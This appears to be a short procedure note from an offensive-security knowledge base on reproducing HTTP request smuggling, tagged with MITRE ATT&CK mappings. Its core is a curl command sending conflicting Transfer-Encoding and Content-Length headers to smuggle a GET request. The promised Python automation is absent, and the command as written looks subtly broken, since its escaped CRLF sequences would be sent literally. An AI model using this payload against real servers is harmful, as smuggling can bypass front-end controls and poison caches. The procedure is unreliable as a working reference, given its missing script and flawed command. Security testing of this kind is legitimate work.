---
tags:
  - http-smuggling
  - automation
type: procedure
tools:
  - '[[tools/Python]]'
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-python-automated-test]]'
platforms:
  - Linux
  - Windows
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Python]]'
id: 0f7ebcbf-5f12-4a7d-8e1e-a11499195319
created_at: '2025-12-13T09:01:21.786Z'
updated_at: '2025-12-13T09:01:21.786Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Reproduce Smuggling with Python Script

## Summary

This procedure uses a Python script to automate running cURL commands with conflicting headers, smuggling a GET request and capturing output for testing.

## Description

Leverage Python's subprocess module to execute cURL, enabling automated reproduction of the vulnerability for consistent testing across environments.

## Requirements

1. Python installed with subprocess module
2. cURL available in PATH
3. Test endpoint for requests

## Defense

Defensive measures and detection strategies:

- Monitor for scripted HTTP requests with anomalies
- Restrict execution of external commands in scripts

## Objectives

1. Automate smuggling test
2. Capture detailed output
3. Reproduce consistently

## Instructions

### Step 1: Execute Automated Test

**Context**: Run cURL via Python to send smuggled GET.

**Command** ([[commands/curl-python-automated-test]]):
```bash
curl -v --include -H "Transfer-Encoding: chunked" -H "Content-Length: 200" -X "POST" -d "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: example.com\r\n\r\n" http://example.com/endpoint
```

> Integrate this into a Python script using subprocess.call() to run and capture output.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

- [[Python]]

## Commands Used

- [[commands/curl-python-automated-test]]

## Tools Used

- [[tools/Python]]
- [[tools/curl]]

## Tags

- [[http-smuggling]]
- [[automation]]
